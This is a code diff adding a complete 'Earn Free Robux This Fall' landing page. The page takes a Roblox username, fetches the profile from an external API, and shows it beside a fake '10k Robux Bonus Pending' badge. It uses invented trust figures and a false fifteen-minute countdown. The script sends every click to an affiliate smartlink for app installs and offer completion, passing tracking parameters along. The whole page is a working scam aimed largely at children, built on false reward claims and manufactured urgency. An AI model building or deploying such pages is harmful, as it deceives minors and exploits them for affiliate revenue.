+      </div>
+    </div>
+  </div>
+
+  <div class="rsl-app">
+    <nav class="rsl-nav">
+      <div class="rsl-brand" aria-label="Site logo">
+        <img class="rsl-brand-logo" src="https://cdn.shopify.com/s/files/1/0771/4747/2064/files/logo.png?v=1785468452" alt="Site logo">
+      </div>
+      <span class="rsl-event-badge">Fall 2026</span>
+    </nav>
+
+    <main class="rsl-main">
+      <section id="rsl-search-screen" class="rsl-search-screen">
+        <div class="rsl-hero">
+          <div class="rsl-summer-tag">
+            <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true">
+              <circle cx="8" cy="8" r="3" fill="currentColor"></circle>
+              <path d="M8 0v2M8 14v2M0 8h2M14 8h2M2.3 2.3l1.4 1.4M12.3 12.3l1.4 1.4M2.3 13.7l1.4-1.4M12.3 3.7l1.4-1.4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></path>
+            </svg>
+            Back To School Roblox Event
+          </div>
+
+          <h1 class="rsl-title">
+            <span class="rsl-title-line rsl-title-main">
+              Earn <span class="rsl-gradient-text">Free Robux</span>
+            </span>
+            <span class="rsl-title-line rsl-title-summer">This Fall</span>
+          </h1>
+
+          <p class="rsl-subtitle">
+            Complete simple steps to earn exclusive Robux for the Back to School Roblox 2026 event. Enter your Roblox username below to get started.
+          </p>
+
+          <form id="rsl-form" class="rsl-form" novalidate="">
+            <div class="rsl-input-group">
+              <input id="rsl-username" type="text" minlength="3" maxlength="20" placeholder="Enter your Roblox username..." autocomplete="off" autocapitalize="none" spellcheck="false" aria-label="Roblox username" required="">
+              <button id="rsl-submit" class="rsl-submit" type="submit">
+                <span class="rsl-submit-label"><strong>Get Started</strong></span>
+                <span class="rsl-spinner" aria-hidden="true"></span>
+              </button>
+            </div>
+            <p id="rsl-message" class="rsl-message" role="status" aria-live="polite"></p>
+          </form>
+
+          <div class="rsl-trust-row" aria-label="Lookup information">
+            <span>2M+ Rewards Claimed</span>
+            <span>500K+ Users</span>
+            <span>4.8 App Rating</span>
+          </div>
+        </div>
+      </section>
+
+      <section id="rsl-result-screen" class="rsl-result-screen">
+        <div class="rsl-dashboard">
+          <article class="rsl-profile-header">
+            <div class="rsl-avatar-wrap">
+              <img id="rsl-avatar" class="rsl-avatar" src="" alt="Roblox avatar">
+              <span class="rsl-online-dot" aria-hidden="true"></span>
+            </div>
+
+            <div class="rsl-profile-info">
+              <div class="rsl-name-row">
+                <h2 id="rsl-display-name"></h2>
+                <span id="rsl-verified" class="rsl-verified" title="Verified Roblox account" hidden="">✓</span>
+              </div>
+              <p id="rsl-handle" class="rsl-handle"></p>
+            </div>
+
+            <div class="rsl-pending-badge" aria-label="10k Robux Bonus Pending">
+              <span class="rsl-pending-star" aria-hidden="true">★</span>
+              <span>10k Robux Bonus Pending</span>
+            </div>
+          </article>
+
+          <article class="rsl-steps-card">
+            <header class="rsl-steps-header">
+              <h3>Earn Your Robux</h3>
+              <span class="rsl-found-tag">3 Simple Steps</span>
+            </header>
+
+            <div class="rsl-step-item">
+              <div class="rsl-step-number rsl-step-one">1</div>
+              <div class="rsl-step-content">
+                <h4>Add Playful to your phone</h4>
+                <p>iOS &amp; Android · Takes less than 30 seconds.</p>
+              </div>
+            </div>
+
+            <div class="rsl-step-item">
+              <div class="rsl-step-number rsl-step-two">2</div>
+              <div class="rsl-step-content">
+                <h4>Complete 2-3 Offers</h4>
+                <p>Test and play new games – earn while you game.</p>
+              </div>
+            </div>
+
+            <div class="rsl-step-item rsl-final-step">
+              <div class="rsl-step-number rsl-step-three">3</div>
+              <div class="rsl-step-content rsl-step-content-wide">
+                <h4>Cash Out Your Rewards</h4>
+                <p>PayPal · CashApp · Venmo · Crypto · Wire Transfer</p>
+                <button id="CTA-Button-1" class="rsl-continue" type="button">Sign Up Now &amp; Claim Robux</button>
+              </div>
+            </div>
+          </article>
+
+          <button id="rsl-search-again" class="rsl-back" type="button">
+            <span aria-hidden="true">←</span>
+            Search another username
+          </button>
+        </div>
+      </section>
+    </main>
+
+    <footer class="rsl-footer">
+      Independent public profile lookup. Not affiliated with or endorsed by Roblox Corporation.
+    </footer>
+  </div>
+</div>
+
+<script>
+  (function () {
+    /* ── viewport fix ── */
+    var viewportMeta = document.querySelector('meta[name="viewport"]');
+    if (!viewportMeta) {
+      viewportMeta = document.createElement("meta");
+      viewportMeta.name = "viewport";
+      document.head.appendChild(viewportMeta);
+    }
+    viewportMeta.content = "width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover";
+
+    /* ── single smartlink — geo-routing handled server-side ── */
+    var LINK = "https://www.stw4c9hx.com/GNW68X/L1B1F8/";
+
+    /* ── pass through any tracker params from the landing URL ── */
+    function buildLink(baseUrl) {
+      try {
+        var u = new URL(baseUrl);
+        var params = new URLSearchParams(window.location.search);
+        params.forEach(function (v, k) { u.searchParams.set(k, v); });
+        var campid = params.get("campid");
+        if (campid && !params.has("sub1")) {
+          u.searchParams.set("sub1", campid);
+        }
+        return u.toString();
+      } catch (e) { return baseUrl; }
+    }
+
+    function applyCTALink() {
+      var finalUrl = buildLink(LINK);
+      var modalCta = document.getElementById("rsl-modal-cta");
+      if (modalCta) modalCta.href = finalUrl;
+      var legacyCta = document.getElementById("CTA-Button-1");
+      if (legacyCta && legacyCta.tagName === "A") legacyCta.href = finalUrl;
+    }
+
+    applyCTALink();
+
+    /* ── element refs ── */
+    var API_URL      = "https://roblox-rb-3e96.vercel.app/api/roblox/user";
+    var root         = document.getElementById("rbx-summer-lookup");
+    if (!root || root.dataset.initialized === "true") return;
+    root.dataset.initialized = "true";
+
+    var searchScreen  = root.querySelector("#rsl-search-screen");
+    var resultScreen  = root.querySelector("#rsl-result-screen");
+    var form          = root.querySelector("#rsl-form");
+    var input         = root.querySelector("#rsl-username");
+    var submit        = root.querySelector("#rsl-submit");
+    var message       = root.querySelector("#rsl-message");
+    var avatar        = root.querySelector("#rsl-avatar");
+    var displayName   = root.querySelector("#rsl-display-name");
+    var handle        = root.querySelector("#rsl-handle");
+    var verified      = root.querySelector("#rsl-verified");
+    var searchAgain   = root.querySelector("#rsl-search-again");
+    var ctaBtn        = root.querySelector("#CTA-Button-1");
+    var modalBackdrop = root.querySelector("#rsl-modal-backdrop");
+    var modalSkip     = root.querySelector("#rsl-modal-skip");
+    var countdownEl   = root.querySelector("#rsl-countdown");
+
+    var selectedUser = null;
+    var countdownInt = null;
+
+    /* ── countdown timer ── */
+    function startCountdown(seconds) {
+      if (countdownInt) clearInterval(countdownInt);
+      var remaining = seconds;
+      function tick() {
+        var m = Math.floor(remaining / 60);
+        var s = remaining % 60;
+        if (countdownEl) {
+          countdownEl.textContent = "Offer expires in " + m + ":" + (s < 10 ? "0" : "") + s;
+        }
+        if (remaining <= 0) {
+          clearInterval(countdownInt);
+          if (countdownEl) countdownEl.textContent = "Offer expired";
+        }
+        remaining--;
+      }
+      tick();
+      countdownInt = setInterval(tick, 1000);
+    }
+
+    /* ── modal open / close ── */
+    function openModal() {
+      modalBackdrop.classList.add("rsl-modal-open");
+      document.body.style.overflow = "hidden";
+      startCountdown(14 * 60 + 59);
+      applyCTALink();
+    }
+
+    function closeModal() {
+      modalBackdrop.classList.remove("rsl-modal-open");
+      document.body.style.overflow = "";
+      if (countdownInt) clearInterval(countdownInt);
+    }
+
+    /* ── step-3 CTA button → opens modal ── */
+    if (ctaBtn) {
+      ctaBtn.addEventListener("click", function () { openModal(); });
+    }
+
+    /* ── skip → close modal, go straight to offer ── */
+    if (modalSkip) {
+      modalSkip.addEventListener("click", function () {
+        closeModal();
+        window.open(buildLink(LINK), "_blank", "noopener");
+      });
+    }
+
+    /* ── close on backdrop click ── */
+    if (modalBackdrop) {
+      modalBackdrop.addEventListener("click", function (e) {
+        if (e.target === modalBackdrop) closeModal();
+      });
+    }
+
+    /* ── helpers ── */
+    function setMessage(text, isSuccess) {
+      message.textContent = text;
+      message.classList.toggle("rsl-success", !!isSuccess);
+    }
+
+    function setLoading(isLoading) {
+      input.disabled = isLoading;
+      submit.disabled = isLoading;
+      submit.classList.toggle("rsl-loading", isLoading);
+    }
+
+    function fallbackAvatar(name) {
+      var safeInitial = String(name || "?").trim().charAt(0).toUpperCase() || "?";
+      var svg = '<svg xmlns="http://www.w3.org/2000/svg" width="420" height="420" viewBox="0 0 420 420">'
+        + '<defs><linearGradient id="avatarGradient" x1="0" y1="0" x2="1" y2="1">'
+        + '<stop stop-color="#2a2a3d"/><stop offset="1" stop-color="#151522"/>'
+        + '</linearGradient></defs>'
+        + '<rect width="420" height="420" rx="210" fill="url(#avatarGradient)"/>'
+        + '<circle cx="210" cy="210" r="197" fill="none" stroke="#00b06f" stroke-width="6"/>'
+        + '<text x="210" y="265" text-anchor="middle" font-family="Arial, sans-serif" font-size="170" font-weight="700" fill="#f0f0f5">' + safeInitial + '</text>'
+        + '</svg>';
+      return "data:image/svg+xml;charset=UTF-8," + encodeURIComponent(svg);
+    }
+
+    function renderUser(user) {
+      selectedUser = user;
+      avatar.src = user.avatarUrl || fallbackAvatar(user.displayName || user.username);
+      avatar.alt = (user.displayName || user.username) + "'s Roblox avatar";
+      displayName.textContent = user.displayName || user.username;
+      handle.textContent = "@" + user.username;
+      verified.hidden = !user.hasVerifiedBadge;
+      searchScreen.hidden = true;
+      resultScreen.classList.add("rsl-active");
+      applyCTALink();
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }
+
+    /* ── form submit ── */
+    form.addEventListener("submit", function (event) {
+      event.preventDefault();
+      var username = input.value.trim();
+      if (!/^[A-Za-z0-9_]{3,20}$/.test(username)) {
+        setMessage("Use 3-20 letters, numbers, or underscores.");
+        input.focus();
+        return;
+      }
+      setLoading(true);
+      setMessage("");
+      fetch(API_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username: username })
+      })
+      .then(function (response) {
+        return response.json().then(function (data) {
+          if (!response.ok) throw new Error(data.error || "The Roblox profile could not be loaded.");
+          if (!data.user) throw new Error("The lookup did not return a Roblox profile.");
+          setMessage("Profile found.", true);
+          renderUser(data.user);
+        });
+      })
+      .catch(function (error) {
+        setMessage(error && error.message ? error.message : "Something went wrong. Please try again.");
+      })
+      .finally(function () {
+        setLoading(false);
+      });
+    });
+
+    /* ── avatar fallback ── */
+    avatar.addEventListener("error", function () {
+      if (!selectedUser) return;
+      avatar.src = fallbackAvatar(selectedUser.displayName || selectedUser.username);
+    });
+
+    /* ── search again ── */
+    searchAgain.addEventListener("click", function () {
+      selectedUser = null;
+      resultScreen.classList.remove("rsl-active");
+      searchScreen.hidden = false;
+      avatar.removeAttribute("src");
+      displayName.textContent = "";
+      handle.textContent = "";
+      verified.hidden = true;
+      setMessage("");
+      input.value = "";
+      input.disabled = false;
+      input.focus();
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    });
+  })();
+</script>
+
+<span id="PING_CONTENT_PUSH_NOTIFICATION" style="display: none;"></span></body></html>
